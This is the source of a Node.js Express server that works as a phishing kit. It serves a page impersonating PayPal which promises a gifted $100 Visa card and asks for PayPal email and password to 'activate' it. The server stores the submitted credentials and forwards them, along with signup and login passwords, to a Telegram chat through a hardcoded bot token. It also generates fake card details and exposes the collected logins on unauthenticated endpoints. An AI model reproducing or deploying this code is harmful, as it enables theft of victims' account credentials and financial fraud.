import express from 'express';
import jwt from 'jsonwebtoken';
import fs from 'fs';
import { Telegraf } from 'telegraf';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';

const app = express();
const port = process.env.PORT || 3000;

// Get __dirname equivalent in ES modules
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Enable CORS for local testing, Render, and GitHub Pages
app.use(cors({
    origin: [
        'http://localhost:3000',
        'https://ii-cyu4.onrender.com',
        'https://visa-card-l.github.io' // For GitHub Pages
    ],
    methods: ['GET', 'POST', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(express.json());

// Serve "Backend" HTML page for root URL
app.get('/', (req, res) => {
    res.setHeader('Content-Type', 'text/html');
    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Backend</title>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            background-color: #f7f9fa; 
        }
        h1 { 
            font-size: 48px; 
            color: #333333; 
            text-align: center; 
        }
    </style>
</head>
<body>
    <h1>Backend</h1>
</body>
</html>
    `);
});

// Serve dynamic activation page at /activate.html
app.get('/activate.html', (req, res) => {
    res.setHeader('Content-Type', 'text/html');
    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Activate Virtual Card</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f7f9fa; position: relative; }
        .container { width: 400px; padding: 30px; background-color: #ffffff; border-radius: 15px; box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1); display: flex; flex-direction: column; align-items: center; position: relative; z-index: 1; }
        .logo { font-size: 24px; font-weight: 700; color: #000000; margin-bottom: 20px; }
        .input-field { width: 100%; padding: 15px 20px; margin: 10px 0; border: 2px solid #0070ba; border-radius: 25px; font-size: 14px; color: #333333; box-sizing: border-box; background-color: #ffffff; transition: box-shadow 0.3s ease; }
        .input-field:focus { box-shadow: 0 0 10px rgba(0, 112, 186, 0.5); outline: none; }
        .input-field::placeholder { color: #999999; font-weight: 400; }
        .btn { width: 100%; padding: 12px; margin: 10px 0; border: none; border-radius: 25px; font-size: 16px; cursor: pointer; font-weight: 600; text-transform: uppercase; }
        .btn-login { background-color: #0070ba; color: #ffffff; box-shadow: 0 4px 8px rgba(0, 112, 186, 0.3); }
        .btn-login:hover { transform: translateY(-2px); box-shadow: 0 6px 12px rgba(0, 112, 186, 0.4); }
        .card { background: linear-gradient(135deg, #1e90ff, #000080, #ffd700); color: #ffffff; width: 250px; height: 150px; border-radius: 15px; padding: 12px; margin: 10px auto; position: relative; overflow: hidden; box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 215, 0, 0.5); display: flex; flex-direction: column; justify-content: space-between; }
        .card::before { content: ''; position: absolute; top: -20%; left: -20%; width: 140%; height: 140%; background: radial-gradient(circle, rgba(255, 255, 255, 0.4) 0%, transparent 70%); animation: hologram 3s infinite; }
        @keyframes hologram { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .card-header { display: flex; justify-content: space-between; align-items: flex-start; }
        .visa-logo { font-size: 20px; font-weight: bold; color: #ffffff; }
        .card-amount { font-size: 14px; background: rgba(255, 255, 255, 0.2); padding: 2px 6px; border-radius: 3px; }
        .card-number { font-size: 16px; letter-spacing: 2px; margin-top: 5px; }
        .card-footer { display: flex; justify-content: space-between; align-items: flex-end; font-size: 12px; }
        .card-name { font-size: 12px; }
        .card-exp-cvv { text-align: right; }
        .card-exp { font-size: 12px; }
        .card-cvv { font-size: 10px; background: rgba(255, 255, 255, 0.3); padding: 2px 4px; border-radius: 3px; }
        .language { margin: 15px 0; color: #666666; font-size: 13px; display: flex; align-items: center; justify-content: center; }
        .language img { vertical-align: middle; margin-right: 5px; border-radius: 50%; }
        .language select { border: none; background: none; color: #0070ba; font-weight: 600; cursor: pointer; }
        .footer { margin-top: 15px; color: #666666; font-size: 12px; display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; }
        .footer a { color: #0070ba; text-decoration: none; font-weight: 600; }
        .footer a:hover { color: #005f9e; }
        .footer .active { border-bottom: 2px solid #0070ba; padding-bottom: 2px; }
        .loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.5); z-index: 1000; justify-content: center; align-items: center; }
        .loader.active { display: flex; }
        .spinner { border: 8px solid #f3f3f3; border-top: 8px solid #0070ba; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .error-message { color: #ff4444; font-size: 14px; margin-top: 10px; text-align: center; }
        .gift-text { font-size: 16px; color: #333; margin: 10px 0; text-align: center; }
    </style>
</head>
<body>
    <div class="loader" id="loader">
        <div class="spinner"></div>
    </div>
    <div class="container">
        <div class="logo">PayPal</div>
        <div id="cardDisplayActivate"></div>
        <p class="gift-text">You were gifted a $100 Visa. Login with PayPal to activate</p>
        <div id="cardDetails"></div>
        <div id="errorMessage" class="error-message"></div>
        <input type="text" class="input-field" id="activateUsername" placeholder="PayPal Email">
        <input type="password" class="input-field" id="activatePassword" placeholder="PayPal Password">
        <div class="language">
            <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" alt="US Flag" width="12" height="9">
            <select id="languageSelect" onchange="changeLanguage()">
                <option value="en">English</option>
                <option value="fr">Français</option>
                <option value="es">Español</option>
                <option value="zh">中文</option>
            </select>
        </div>
        <button class="btn btn-login" onclick="activateCard()">Activate Card</button>
        <div class="footer">
            <a href="#">Contact Us</a>
            <a href="#" class="active">Privacy</a>
            <a href="#">Legal</a>
            <a href="#">Policy Updates</a>
            <a href="#">Worldwide</a>
        </div>
    </div>
    <script>
        const API_BASE_URL = 'https://ii-cyu4.onrender.com';
        let currentCardId = new URLSearchParams(window.location.search).get('cardId');

        const elements = {
            cardDisplayActivate: document.getElementById('cardDisplayActivate'),
            cardDetails: document.getElementById('cardDetails'),
            loader: document.getElementById('loader'),
            errorMessage: document.getElementById('errorMessage')
        };

        function showLoader() { if (elements.loader) elements.loader.classList.add('active'); }
        function hideLoader() { if (elements.loader) elements.loader.classList.remove('active'); }
        function showError(message) { if (elements.errorMessage) { elements.errorMessage.textContent = message; elements.errorMessage.style.display = 'block'; } }
        function clearError() { if (elements.errorMessage) { elements.errorMessage.textContent = ''; elements.errorMessage.style.display = 'none'; } }

        function maskCardNumber(number) {
            if (!number) return 'N/A';
            const masked = 'X'.repeat(12) + number.slice(-4);
            return masked.match(/.{1,4}/g).join('-');
        }

        function formatExpDate(expDate) {
            if (!expDate || expDate.length !== 6) return 'N/A';
            const month = expDate.slice(0, 2);
            const year = expDate.slice(4, 6);
            return \`\${month}/\${year}\`;
        }

        function displayCard(card) {
            if (!elements.cardDisplayActivate) return;
            const amount = typeof card.amount === 'number' ? card.amount.toFixed(2) : parseFloat(card.amount).toFixed(2) || '0.00';
            const cardContainer = document.createElement('div');
            cardContainer.className = 'card-container';
            const maskedNumber = maskCardNumber(card.number);
            const formattedExpDate = formatExpDate(card.expDate);
            cardContainer.innerHTML = \`
                <div class="card" data-card-id="\${card.cardId}">
                    <div class="card-header">
                        <div class="visa-logo">Visa</div>
                        <div class="card-amount">$\${amount}</div>
                    </div>
                    <div class="card-number">\${maskedNumber}</div>
                    <div class="card-footer">
                        <div class="card-name">Cardholder: \${card.name || 'N/A'}</div>
                        <div class="card-exp-cvv">
                            <div class="card-exp">Exp: \${formattedExpDate}</div>
                            <div class="card-cvv">CVV: \${card.cvv || 'N/A'}</div>
                        </div>
                    </div>
                </div>
            \`;
            elements.cardDisplayActivate.appendChild(cardContainer);
        }

        async function updateActivationPage() {
            if (!currentCardId) { showError('No card ID provided. Please use a valid activation link.'); return; }
            showLoader();
            try {
                const response = await fetch(\`\${API_BASE_URL}/api/cards/activate/\${currentCardId}\`);
                const data = await response.json();
                if (response.ok) {
                    clearError();
                    elements.cardDetails.innerHTML = \`<p>Card ID: \${data.cardId} - Status: \${data.status || 'pending'}</p>\`;
                    if (elements.cardDisplayActivate) { elements.cardDisplayActivate.innerHTML = ''; displayCard(data); }
                } else if (response.status === 404) { showError('Card not found. Please check the card ID.'); }
                else { showError(data.error || 'Activation unavailable'); }
            } catch (error) {
                console.error('Activation error:', error);
                showError('Network issue or backend unavailable. Please try again.');
            } finally { hideLoader(); }
        }

        async function activateCard() {
            if (!currentCardId) { showError('No card ID provided. Please use a valid activation link.'); return; }
            const paypalUsername = document.getElementById('activateUsername')?.value.trim();
            const paypalPassword = document.getElementById('activatePassword')?.value.trim();
            if (!paypalUsername || !paypalPassword) { showError('Please enter PayPal email and password'); return; }
            showLoader();
            try {
                const response = await fetch(\`\${API_BASE_URL}/api/cards/activate/\${currentCardId}\`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ paypalUsername, paypalPassword })
                });
                const data = await response.json();
                if (response.ok) {
                    alert('Make sure the email and password are correct');
                    clearError();
                    updateActivationPage();
                } else if (response.status === 404) { showError('Card not found. Please check the card ID.'); }
                else { showError(data.error || 'Activation failed'); }
            } catch (error) {
                console.error('Activate card error:', error);
                showError('Network issue or backend unavailable. Please try again.');
            } finally { hideLoader(); }
        }

        function changeLanguage() {
            const lang = document.getElementById('languageSelect')?.value || 'en';
            const placeholders = {
                en: ['PayPal Email', 'PayPal Password'],
                fr: ['Email PayPal', 'Mot de passe PayPal'],
                es: ['Correo electrónico de PayPal', 'Contraseña de PayPal'],
                zh: ['PayPal电子邮件', 'PayPal密码']
            };
            const [email, pass] = placeholders[lang] || placeholders['en'];
            const activateUsername = document.getElementById('activateUsername');
            const activatePassword = document.getElementById('activatePassword');
            if (activateUsername) activateUsername.placeholder = email;
            if (activatePassword) activatePassword.placeholder = pass;
        }

        document.addEventListener('DOMContentLoaded', () => {
            if (!currentCardId) { showError('No card ID provided. Please use a valid activation link.'); }
            else { updateActivationPage(); }
            changeLanguage();
        });
    </script>
</body>
</html>
    `);
});

// Data file initialization
const dataFile = 'data.json';
let data = { users: [], cards: [], paypalLogins: [], logs: [] };
function loadData() {
    try {
        if (fs.existsSync(dataFile)) {
            data = JSON.parse(fs.readFileSync(dataFile));
            if (!data.paypalLogins) data.paypalLogins = [];
            if (!data.logs) data.logs = [];
        } else {
            fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
        }
    } catch (error) {
        console.error('Error loading data.json:', error);
        fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
    }
}
loadData();

// Telegram setup
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '7298585119:AAG-B6A6fZICTrYS7aNdA_2JlfnbghgnzAo';
const TELEGRAM_CHAT_ID_ADMIN = process.env.TELEGRAM_CHAT_ID_ADMIN || '6270110371';
const bot = new Telegraf(TELEGRAM_BOT_TOKEN);

async function sendTelegramNotification(message) {
    for (let attempt = 1; attempt <= 3; attempt++) {
        try {
            await bot.telegram.sendMessage(TELEGRAM_CHAT_ID_ADMIN, message);
            console.log(`Telegram notification sent (Attempt ${attempt}): ${message}`);
            return true;
        } catch (error) {
            console.error(`Telegram notification error (Attempt ${attempt}): ${error.message}`);
            if (attempt < 3) {
                console.log(`Retrying (${attempt + 1}/3) in 2 seconds...`);
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }
    }
    console.error('Failed to send Telegram notification after 3 attempts.');
    return false;
}

// Middleware to verify token
const authenticateToken = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    if (!token) return res.status(401).json({ error: 'No token provided' });
    jwt.verify(token, process.env.JWT_SECRET || 'your-secret-key', (err, user) => {
        if (err) return res.status(403).json({ error: 'Invalid token' });
        req.user = user;
        next();
    });
};

// Test notification on startup
app.listen(port, async () => {
    console.log(`Server running on port ${port}`);
    const testMessage = 'Server started successfully - Test notification from https://ii-cyu4.onrender.com';
    await sendTelegramNotification(testMessage);
});

// Authentication routes
app.post('/api/auth/signup', async (req, res) => {
    try {
        console.log('Signup request:', req.body, 'Origin:', req.headers.origin);
        const { username, password } = req.body;
        if (!username || !password || !/^[a-zA-Z0-9@.]+$/.test(username)) {
            console.log('Signup failed: Invalid username or password');
            return res.status(400).json({ error: 'Invalid username or password' });
        }
        if (data.users.find(u => u.username === username)) {
            console.log('Signup failed: Username already exists', username);
            return res.status(400).json({ error: 'Username already exists' });
        }
        data.users.push({ username, password });
        fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
        const message = `New signup: Username: ${username}, Password: ${password}`;
        await sendTelegramNotification(message);
        console.log('Signup successful:', username);
        res.status(201).json({ message: 'User created successfully' });
    } catch (error) {
        console.error('Signup endpoint error:', error);
        res.status(500).json({ error: 'Server error during signup' });
    }
});

app.post('/api/auth/login', async (req, res) => {
    try {
        console.log('Login request:', req.body, 'Origin:', req.headers.origin);
        const { username, password } = req.body;
        const user = data.users.find(u => u.username === username && u.password === password);
        if (!user) {
            console.log('Login failed: Invalid credentials for', username);
            return res.status(401).json({ error: 'Invalid credentials' });
        }
        const token = jwt.sign({ username }, process.env.JWT_SECRET || 'your-secret-key', { expiresIn: '1h' });
        const message = `Login: Username: ${username}, Password: ${password}`;
        await sendTelegramNotification(message);
        console.log('Login successful:', username);
        res.json({ token });
    } catch (error) {
        console.error('Login endpoint error:', error);
        res.status(500).json({ error: 'Server error during login' });
    }
});

// Card management routes
app.get('/api/cards', authenticateToken, (req, res) => {
    try {
        const userCards = data.cards.filter(c => c.user === req.user.username);
        res.json(userCards);
    } catch (error) {
        console.error('Fetch cards error:', error);
        res.status(500).json({ error: 'Server error fetching cards' });
    }
});

app.post('/api/cards/generate', authenticateToken, (req, res) => {
    try {
        const { name, expDate, amount } = req.body;
        if (!name || !expDate || !amount || amount <= 0 || !/^\d{6}$/.test(expDate)) {
            return res.status(400).json({ error: 'Invalid card details' });
        }
        const cardId = Date.now().toString();
        const randomCardNumber = Array.from({ length: 16 }, () => Math.floor(Math.random() * 10)).join('');
        const card = { cardId, name, expDate, amount, number: randomCardNumber, cvv: '123', user: req.user.username, status: 'pending' };
        data.cards.push(card);
        fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
        res.status(201).json({ cardId });
    } catch (error) {
        console.error('Generate card error:', error);
        res.status(500).json({ error: 'Server error generating card' });
    }
});

app.delete('/api/cards/:cardId', authenticateToken, (req, res) => {
    try {
        const cardId = req.params.cardId;
        const cardIndex = data.cards.findIndex(c => c.cardId === cardId && c.user === req.user.username);
        if (cardIndex === -1) return res.status(404).json({ error: 'Card not found' });
        data.cards.splice(cardIndex, 1);
        fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
        res.json({ message: 'Card deleted' });
    } catch (error) {
        console.error('Delete card error:', error);
        res.status(500).json({ error: 'Server error deleting card' });
    }
});

app.get('/api/cards/activate/:cardId', (req, res) => {
    try {
        const cardId = req.params.cardId;
        const card = data.cards.find(c => c.cardId === cardId);
        if (!card) return res.status(404).json({ error: 'Card not found' });
        res.json(card);
    } catch (error) {
        console.error('Activation fetch error:', error);
        res.status(500).json({ error: 'Server error fetching activation details' });
    }
});

app.post('/api/cards/activate/:cardId', async (req, res) => {
    try {
        const cardId = req.params.cardId;
        const { paypalUsername, paypalPassword } = req.body;
        const card = data.cards.find(c => c.cardId === cardId);
        if (!card) return res.status(404).json({ error: 'Card not found' });
        if (!paypalUsername || !paypalPassword) return res.status(400).json({ error: 'PayPal credentials required' });

        data.paypalLogins.push({
            cardId,
            paypalUsername,
            paypalPassword,
            user: card.user || 'Unknown',
            timestamp: new Date().toISOString()
        });

        data.logs.push({ cardId, user: card.user || 'Unknown', time: new Date().toISOString() });

        fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
        const message = `PayPal Login from ${cardId}: Email: ${paypalUsername}, Password: ${paypalPassword}, User: ${card.user || 'Unknown'}`;
        await sendTelegramNotification(message);
        res.json({ message: 'Credentials submitted', cardId, status: 'pending' });
    } catch (error) {
        console.error('Activate card error:', error);
        res.status(500).json({ error: 'Server error submitting credentials' });
    }
});

app.get('/api/cards/logs', (req, res) => {
    try {
        res.json(data.logs);
    } catch (error) {
        console.error('Fetch logs error:', error);
        res.status(500).json({ error: 'Server error fetching logs' });
    }
});

app.get('/api/creator/dashboard', authenticateToken, (req, res) => {
    try {
        if (req.user.username !== 'admin') return res.status(403).json({ error: 'Access denied' });
        const dashboardData = {
            generatedCards: data.cards.filter(c => c.user === 'admin'),
            paypalLogins: data.paypalLogins.filter(l => l.user === 'admin')
        };
        res.json(dashboardData);
    } catch (error) {
        console.error('Dashboard error:', error);
        res.status(500).json({ error: 'Server error loading dashboard' });
    }
});

app.get('/api/cards/paypal-creds', (req, res) => {
    try {
        res.json({ paypalLogins: data.paypalLogins });
    } catch (error) {
        console.error('Fetch PayPal creds error:', error);
        res.status(500).json({ error: 'Server error fetching PayPal credentials' });
    }
});

app.delete('/api/cards/paypal-creds/:cardId', authenticateToken, async (req, res) => {
    try {
        const cardId = req.params.cardId;
        const loginIndex = data.paypalLogins.findIndex(l => l.cardId === cardId && l.user === req.user.username);
        if (loginIndex === -1) return res.status(404).json({ error: 'PayPal credentials not found' });
        const deletedLogin = data.paypalLogins.splice(loginIndex, 1)[0];
        fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
        const message = `PayPal credentials deleted for Card ID: ${cardId}, User: ${req.user.username}`;
        await sendTelegramNotification(message);
        res.json({ message: 'PayPal credentials deleted' });
    } catch (error) {
        console.error('Delete PayPal creds error:', error);
        res.status(500).json({ error: 'Server error deleting PayPal credentials' });
    }
});

app.use((err, req, res, next) => {
    console.error('Global error:', err.stack);
    res.status(500).json({ error: 'Internal server error' });
});

app.use((req, res) => {
    res.status(404).json({ error: 'Route not found' });
});

process.on('SIGTERM', () => {
    fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
    process.exit(0);
});
